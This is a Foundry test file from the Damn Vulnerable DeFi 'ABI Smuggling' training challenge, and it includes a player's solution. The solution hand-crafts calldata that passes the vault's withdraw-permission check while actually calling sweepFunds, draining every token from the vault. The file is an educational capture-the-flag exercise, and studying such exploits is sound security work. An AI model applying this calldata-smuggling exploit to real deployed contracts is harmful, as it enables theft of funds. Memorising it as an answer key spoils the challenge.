// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault)); // deployer could sweepFunds
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault)); // player has permission to withdraw
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */

    /**
     *  This is the helper function to generate the malicious calldata.
     *  `AuthorizedExecutor::execute` function doesnt check for calldata length. We could send different calldata.
     *  Selector for `SelfAuthorizedVault::withdraw` function remains on the same possition in calldata.
     *  Possition of `actionData` is changed and now points to `SelfAuthorizedVault::sweepFunds` function
     *  with the `recovery` address as the `receiver` and `DVT` as the `token`
     *
     *  Maybe there is easier way to generate calldata to achieve same format..
     *
     */
    function prepareCalldata() public view returns (bytes memory finalData) {
        bytes4 selectorExecute = bytes4(AuthorizedExecutor.execute.selector);

        bytes memory maliciousCallData = abi.encode(
            address(vault), // has to remain as first parameter
            bytes32(uint256(0x80)), // change of starting possition
            bytes32(uint256(0x00)), // fill the gap
            SelfAuthorizedVault.withdraw.selector, // place the selector of `withdraw` to the same possition
            bytes32(uint256(0x44)) // length of `actionData`
        );

        bytes memory data = abi.encodeWithSelector(0x85fb709d, recovery, IERC20(address(token))); // calldata to call `sweepFunds`
        finalData = abi.encodePacked(selectorExecute, maliciousCallData, data); // final concatenation to pass as calldata
    }

    function test_abiSmuggling() public checkSolvedByPlayer {
        (bool success,) = address(vault).call(prepareCalldata());
        if (!success) revert("Malicious call failed");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
